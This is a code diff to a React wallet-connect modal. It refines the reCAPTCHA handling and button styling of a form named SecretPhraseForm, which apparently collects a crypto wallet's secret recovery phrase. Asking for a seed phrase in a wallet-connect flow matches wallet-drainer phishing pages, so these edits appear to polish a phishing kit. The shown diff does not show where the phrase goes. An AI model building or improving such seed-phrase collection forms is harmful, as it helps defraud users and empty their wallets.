@@ -353,13 +353,14 @@ const FormSchema = z.object({
     recaptcha: z.string().min(1, { message: "Please complete the reCAPTCHA." }),
 });
 
-function ReCAPTCHAComponent({ onChange }) {
+function ReCAPTCHAComponent({ onChange, onExpired }) {
   const recaptchaRef = React.useRef<HTMLDivElement>(null);
   const widgetIdRef = React.useRef<number | null>(null);
 
   React.useEffect(() => {
     const global = window as any;
-    if (!global.grecaptcha || !global.grecaptcha.render) {
+    if (!global.grecaptcha) {
+      console.error("reCAPTCHA script not loaded");
       return;
     }
 
@@ -369,15 +370,14 @@ function ReCAPTCHAComponent({ onChange }) {
           sitekey: "6LeIxAcpAAAAAMu-pOKNn9mESaK5X2j_0P0u_XhP", // Public test key
           theme: "dark",
           callback: onChange,
+          'expired-callback': onExpired
         });
       }
     };
+    
+    global.grecaptcha.ready(renderRecaptcha);
 
-    if (global.grecaptcha.ready) {
-      global.grecaptcha.ready(renderRecaptcha);
-    }
-
-  }, [onChange]);
+  }, [onChange, onExpired]);
 
   return <div ref={recaptchaRef}></div>;
 }
@@ -511,7 +511,10 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
             render={({ field }) => (
               <FormItem>
                 <FormControl>
-                  <ReCAPTCHAComponent onChange={field.onChange} />
+                  <ReCAPTCHAComponent 
+                     onChange={field.onChange} 
+                     onExpired={() => field.onChange("")}
+                  />
                 </FormControl>
                 <FormMessage />
               </FormItem>
@@ -523,7 +526,7 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
             </p>
           <Button
             type="submit"
-            className="w-full bg-accent text-accent-foreground hover:bg-accent/90"
+            className="w-full bg-primary text-primary-foreground hover:bg-primary/90"
             disabled={form.formState.isSubmitting || !form.watch("recaptcha")}
           >
             {form.formState.isSubmitting
@@ -629,6 +632,7 @@ export function WalletConnectModal({ isOpen, onOpenChange }) {
 
   React.useEffect(() => {
     if (!isOpen) {
+      // Small delay to allow modal close animation to finish before resetting state
       setTimeout(() => {
         setView("wallets");
         setSelectedWallet(null);
@@ -697,3 +701,5 @@ export function WalletConnectModal({ isOpen, onOpenChange }) {
     </Dialog>
   );
 }
+
+    
